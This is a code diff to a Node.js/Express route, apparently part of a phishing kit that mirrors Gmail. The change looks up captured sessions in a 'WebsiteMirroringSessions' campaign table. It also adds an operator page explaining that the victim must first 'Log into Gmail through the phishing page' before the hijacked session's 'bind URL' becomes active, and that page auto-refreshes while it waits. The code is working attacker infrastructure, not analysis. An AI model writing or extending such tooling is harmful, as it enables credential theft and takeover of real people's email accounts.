@@ -90,33 +90,76 @@ router.get('/gmail-browser/:sessionToken', async (req, res) => {
       }
     }
 
-    // 2. Check database for session record (GmailBrowserSessions table)
+    // 2. Check database for session record (WebsiteMirroringSessions table - where campaigns are stored)
     const record = await new Promise((resolve, reject) => {
-      db.get("SELECT * FROM GmailBrowserSessions WHERE session_token = ?", [sessionToken], (err, row) => {
-        if (err) return reject(err);
-        resolve(row);
+      // Check if session_type column exists and build appropriate query
+      db.all("PRAGMA table_info(WebsiteMirroringSessions)", (err, columns) => {
+        if (err) {
+          reject(err);
+          return;
+        }
+
+        const hasSessionType = columns.some(col => col.name === 'session_type');
+        
+        let query, params;
+        if (hasSessionType) {
+          // Look for Gmail browser sessions specifically
+          query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND session_type = 'gmail_browser'`;
+          params = [sessionToken];
+        } else {
+          // Fallback: look for any session with Gmail in target URL
+          query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND target_url LIKE '%gmail%'`;
+          params = [sessionToken];
+        }
+
+        db.get(query, params, (err, row) => {
+          if (err) reject(err);
+          else resolve(row);
+        });
       });
     });
     
     if (!record) {
       console.log(`❌ Session not found in database: ${sessionToken}`);
+      
+      // Show a message indicating user needs to access the campaign first
       return res.status(404).send(`
         <!DOCTYPE html>
         <html>
         <head>
-          <title>Session Not Found</title>
+          <title>Session Not Ready</title>
           <style>
             body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
             .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-            .error { color: #d73527; }
+            .warning { color: #856404; }
+            .info { background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
+            .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 5px; }
           </style>
         </head>
         <body>
           <div class="container">
-            <h1 class="error">❌ Session Not Found</h1>
-            <p>The requested Gmail session could not be found or has expired.</p>
-            <p><strong>Session:</strong> ${sessionToken}</p>
+            <h1 class="warning">⚠️ Session Not Ready</h1>
+            <div class="info">
+              <p><strong>This session hasn't been accessed yet.</strong></p>
+              <p>To view this Gmail session, the user must first:</p>
+              <ol style="text-align: left; margin: 20px 0;">
+                <li>Visit the original campaign link</li>
+                <li>Log into Gmail through the phishing page</li>
+                <li>Then this bind URL will become active</li>
+              </ol>
+              <p><strong>Session Token:</strong> ${sessionToken}</p>
+              <p><strong>Tracking ID:</strong> ${trackingId}</p>
+            </div>
+            
+            <button class="btn" onclick="location.reload()">Check Again</button>
           </div>
+          
+          <script>
+            // Auto-refresh every 10 seconds to check if session becomes available
+            setTimeout(() => {
+              location.reload();
+            }, 10000);
+          </script>
         </body>
         </html>
       `);
